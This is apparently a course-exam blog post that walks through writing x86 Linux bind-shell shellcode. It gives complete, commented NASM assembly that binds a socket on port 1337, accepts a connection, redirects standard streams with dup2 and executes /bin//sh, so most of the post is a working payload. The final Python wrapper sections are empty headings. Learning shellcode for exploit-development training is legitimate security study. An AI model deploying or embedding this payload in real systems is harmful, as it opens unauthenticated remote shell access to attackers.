---
layout: single
title: SLAE Assignment 1 - Shell Bind Tcp
date: 2020-4-28
classes: wide
tags:
    - Shellcoding
    - Linux
    - x86
    - SLAE
---

## Introduction
This is the first post of the SLAE exam assignments series.

The first assignement is to create a a shell_bind_tcp shellcode that binds to a port and execs shell on incoming connection.
The port number should be easily configurable.

## Shellcode overview

### Socket basics

To listen and accept incoming connections, we need to follow those steps :

 - first we need to create a socket with the desired properties (here an IPv4, TCP socket)
 - then bind this socket to an address and port
 - put the socket in a listening mode to wait for connections
 - and finally, accept new incoming connection

We have two ways to do this : 
- Using the socket, bind, listen and accept4 syscalls 
- Or using the socketcall syscall 

In the following, we will use the socketcall syscall.

### Bind a shell to the socket

Once an incoming connection is accepted, we need to redirect the standards i/o streams to it so we can interact with the shell we will be executing.
To do so we need to duplicate the socket file descriptor and overwrite the stdin(0), stdout(1) and stderr(2) files descriptor, using dup2 syscall.

Then we can run our shell using the execve syscall.

## The assembly code

### Ressources 

First, we can 

```c
#man socketcall
int socketcall(int call, unsigned long *args);
```

```c
#man socket
int socket(int domain, int type, int protocol);
```

```c
#man bind
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```

```c
#man listen
int listen(int sockfd, int backlog);
```

```c
#man 2 accept
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
```

```c
#man dup2
int dup2(int oldfd, int newfd);
```

```c
#man execve
int execve(const char *filename, char *const argv[], char *const envp[]);
```

```c
#man 7 ip
struct sockaddr_in {
               sa_family_t    sin_family; /* address family: AF_INET */
               in_port_t      sin_port;   /* port in network byte order */
               struct in_addr sin_addr;   /* internet address */
           };
```

```c
#/usr/include/asm/unistd_32.h
#define __NR_execve 11
#define __NR_dup2 63
#define __NR_socketcall 102
```

```c
#/usr/include/linux/net.h
#define SYS_SOCKET	1		/* sys_socket(2)		*/
#define SYS_BIND	2		/* sys_bind(2)			*/
#define SYS_LISTEN	4		/* sys_listen(2)		*/
#define SYS_ACCEPT	5		/* sys_accept(2)		*/
```

```c
#/usr/include/netinet/in.h
#define	INADDR_ANY		((in_addr_t) 0x00000000)
```

```c
# cat /usr/include/bits/socket_type.h
  SOCK_STREAM = 1,		/* Sequenced, reliable, connection-based
#define SOCK_STREAM SOCK_STREAM
```

```c
#/usr/include/bits/socket.h
#define PF_INET		2	/* IP protocol family.  */
#define AF_INET		PF_INET
```

### Create the socket

We need to use the socketcall with SYS_SOCKET in EBX and ECX pointing to the socket function arguments on the stack.<br>
These arguments need to be AF_INET, SOCK_STREAM, 0 placed in reverse order because the stack is a LIFO data structure (Last In First Out).<br>
A socket file descriptor will be returned in EAX, we will save it in EDI for later use.

```nasm
;socket(AF_INET, SOCK_STREAM, 0)
;socketcall(SYS_SOCKET, *socket_args)
    xor ebx, ebx        ; set ebx to 0
    mul ebx             ; set eax and edx to 0

    push ebx            ; 0 for the protocol argument
    inc ebx	     
    push ebx            ; SOCK_STREAM
    push byte 0x2       ; AF_INET

    mov ecx, esp        ; ecx now points to the socket's arguments
                        ; ebx already set to SYS_SOCKET
    add al, 0x66        ; socketcall 
    int 0x80
    
    xchg edi, eax       ; we save the sockfd to edi 
                        ; (xchg is one byte opcode, so best than mov(2 bytes) 
                        ; because we dont care about eax value)
```

### Bind the socket

```nasm
;sockaddr{AF_INET, port, INADDR_ANY}
;bind(sockfd, *addr, addrlen)
;socketcall(SYS_BIND, *socket_args)
    pop    ebx          ; ebx set to SYS_BIND 
                        ; 2 was the last value pushed on the stack
    push   edx          ; INADDR_ANY (bind to 0.0.0.0)
    push word  0x3905   ; the port 1337
    push   bx           ; AF_INET
    mov    ecx,esp      ; ecx point to the sockaddr struct

    push   0x10         ; sockaddr struct length
    push   ecx          ; address to the sockaddr struct
    push   edi          ; sockfd previously saved

    mov    ecx,esp      ; ecx points to the bind's arguments
    push   0x66         ; socketcall
    pop    eax           
    int    0x80
```

### Listen for connections

```nasm
;socketcall(SYS_LISTEN, *socket_args)
;listen(sockfd, backlog)
    push   edx          ; 0, no queue allowed
    push   edi          ; the sockfd previously saved
    mov    ecx,esp      ; ecx point to the listen's arguments
    shl    ebx, 1       ; SYS_LISTEN
                        ; shift one bit left (multiply by 2) so ebx is 4 
                        ; (2 bytes opcode, 3 bytes for: add ebx, 0x2
    mov    al,0x66      ; socketcall
    int    0x80
```

### Accept connection

```nasm
;socketcall(SYS_ACCEPT, *socket_args)
;accept(sockfd, *addr, *addrlen)
    push   edx          ; null pointer
    push   edx          ; null pointer, we don't care about client informations
    push   edi          ; sockfd
    mov    ecx,esp      ; ecx points to the accept's arguments
    inc    ebx          ; SYS_ACCEPT
    mov    al,0x66      ; socketcall
    int    0x80
```

### Overwrite standard I/O

```nasm
;dup2(sockfd, stderr)
;dup2(sockfd, stdout)
;dup2(sockfd, stdin])
    xchg   ebx, eax     ; set ebx to the new sockfd from accept
    push byte 0x3       
    pop    ecx
link:
    dec    ecx          ; set ecx from 2 to 0 (stderr to stdin)
    mov    al,0x3f      ; dup2
    int    0x80
    jne    link         ; if ecx not equal to stdin, overwrite next standard I/O stream
```

### Pop a shell

```nasm
;execve("/bin//sh", NULL, NULL) 

    push   edx          ; string terminator 0x00
    push   0x68732f2f   ; push /bin//sh in reverse order
    push   0x6e69622f
    mov    ebx,esp      ; ebx point to /bin//sh string
                        ; ecx and edx are already set to 0x00 (Null pointer)
    mov    al,0xb       ; execve 
    int    0x80	
```

## The python wrapper to customize port

## Exec shell using a python script

